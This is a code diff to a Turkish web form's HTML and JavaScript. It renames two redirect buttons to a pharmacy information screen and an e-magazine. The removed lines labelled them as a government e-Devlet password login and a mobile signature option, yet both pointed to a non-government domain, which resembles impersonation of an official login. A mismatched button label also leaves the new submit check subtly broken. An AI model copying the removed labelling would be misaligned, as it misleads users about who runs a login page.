@@ -41,8 +41,8 @@
                         <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                             <fieldset>
                                 <div class="form-row center-item">
-                                    <button class="btn btn-send" name="submitButton" type="button" onclick="showAlert('E-devlet Şifresi', 'https://eczaneler.works/')">E-devlet Şifresi</button>
-                                    <button class="btn btn-send" name="submitButton" type="button" onclick="showAlert('Mobil İmza', 'https://e-dergi.eczaneler.works/')">Mobil İmza</button>
+                                    <button class="btn btn-send" name="submitButton" type="button" onclick="showAlert('Nöbetçi Eczaneler Bilgi Ekranı', 'https://eczaneler.works/')">Nöbetçi Eczaneler Bilgi Ekranı</button>
+                                    <button class="btn btn-send" name="submitButton" type="button" onclick="showAlert('E-dergi', 'https://e-dergi.eczaneler.works/')">E-dergi Sistemi</button>
                                 </div>
                             </fieldset>
                         </form>
@@ -68,9 +68,9 @@
     <script type="text/javascript">
         function showAlert(method, redirectURL) {
             alert(method + " seçildi.");
-            if (method === "E-devlet Şifresi" && confirm("E-devlet Şifresine yönlendirilmek istediğinize emin misiniz?")) {
+            if (method === "Nöbetçi Eczaneler Bilgi Ekranı" && confirm("Nöbetçi Eczaneler Bilgi Ekranına yönlendirilmek istediğinize emin misiniz?")) {
                 window.location.href = redirectURL;
-            } else if (method === "Mobil İmza" && confirm("Mobil İmza'ya yönlendirilmek istediğinize emin misiniz?")) {
+            } else if (method === "E-dergi" && confirm("E-dergi sistemine yönlendirilmek istediğinize emin misiniz?")) {
                 window.location.href = redirectURL;
             }
         }
@@ -81,12 +81,12 @@
 
         document.getElementById("loginForm").addEventListener("submit", function (event) {
             var selectedButton = document.querySelector(".btn-send:focus");
-            if (selectedButton && selectedButton.textContent === "E-devlet Şifresi") {
+            if (selectedButton && selectedButton.textContent === "Nöbetçi Eczaneler Bilgi Ekranı") {
                 event.preventDefault();
-                showAlert('E-devlet Şifresi', 'https://eczaneler.works/');
-            } else if (selectedButton && selectedButton.textContent === "Mobil İmza") {
+                showAlert('Nöbetçi Eczaneler Bilgi Ekranı', 'https://eczaneler.works/');
+            } else if (selectedButton && selectedButton.textContent === "E-Dergi Sistemi") {
                 event.preventDefault();
-                showAlert('Mobil İmza', 'https://e-dergi.eczaneler.works/');
+                showAlert('E-dergi', 'https://e-dergi.eczaneler.works/');
             }
         });
     </script>
